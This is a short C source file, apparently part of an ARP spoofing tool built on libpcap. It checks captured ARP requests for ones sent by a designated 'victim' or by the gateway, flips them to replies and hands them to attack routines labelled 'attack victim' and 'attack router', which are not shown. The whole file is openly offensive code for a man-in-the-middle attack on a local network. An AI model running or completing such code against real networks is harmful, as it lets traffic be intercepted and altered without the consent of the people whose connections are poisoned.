#include "myHeader.h"
/* check sender is victim? or gateway? */
int checkSender(pcap_t* handle, const u_char* packet, PLANINFO LanInfo)
{
	PARP_PACKET arpPacket = (PARP_PACKET)packet;
	u_short OpCode = ntohs(arpPacket->arp.Opcode);
	if (OpCode == REQUEST)
	{
		if (checkVictim(&(arpPacket->ethernet), LanInfo))
		{
			arpPacket->arp.Opcode = ntohs(REPLY);
			printf("attack victim\n");
			attackvictim(handle, arpPacket, LanInfo);
		}
		else if (checkGateWay(&(arpPacket->ethernet), LanInfo))
		{
			arpPacket->arp.Opcode = ntohs(REPLY);
			printf("attack router\n");
			attackRouter(handle, arpPacket, LanInfo);
		}
	}
	return 0;
}
int checkVictim(PETHERNET_HEADER eh, PLANINFO LanInfo)
{
	int srcCheck, dstCheck;
	srcCheck = memcmp(eh->src_MAC, LanInfo->victimMAC, sizeof(u_char) * MACLEN);
	dstCheck = memcmp(eh->dst_MAC, LanInfo->myMAC, sizeof(u_char) * MACLEN);
	return (!srcCheck) && (!dstCheck);
}
int checkGateWay(PETHERNET_HEADER eh, PLANINFO LanInfo)
{
	int srcCheck, dstCheck;
	srcCheck = memcmp(eh->src_MAC, LanInfo->gatewayMAC, sizeof(u_char) * MACLEN);
	dstCheck = memcmp(eh->dst_MAC, LanInfo->myMAC, sizeof(u_char) * MACLEN);
	return (!srcCheck) && (!dstCheck);
}